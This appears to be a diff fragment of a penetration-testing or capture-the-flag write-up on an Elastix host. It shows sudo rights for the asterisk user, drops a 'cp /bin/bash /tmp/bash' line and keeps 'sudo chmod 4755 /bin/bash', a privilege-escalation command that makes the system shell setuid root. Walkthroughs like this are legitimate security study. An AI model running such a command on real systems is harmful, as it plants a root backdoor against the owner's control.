@@ -783,9 +783,6 @@ User asterisk may run the following commands on this host:
     (root) NOPASSWD: /usr/sbin/elastix-helper
 
 
-bash-3.2$ cp /bin/bash /tmp/bash
-
-
 bash-3.2$ sudo chmod 4755 /bin/bash
 
 
